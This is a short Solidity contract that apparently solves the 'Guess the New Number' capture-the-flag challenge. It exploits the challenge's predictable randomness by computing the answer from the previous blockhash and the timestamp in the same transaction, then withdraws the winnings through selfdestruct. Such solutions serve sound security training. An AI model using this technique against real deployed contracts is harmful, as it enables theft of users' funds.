pragma solidity ^0.4.21;
import './GuessTheNewNumberChallenge.sol';

contract Solution{
  function() public payable{}

  function solve(address _address) public payable{
    require(msg.value == 1 ether);

    GuessTheNewNumberChallenge cte = GuessTheNewNumberChallenge(_address);
    cte.guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number-1), now)));
  }

  function destroy() public{
    selfdestruct(msg.sender);
  }
}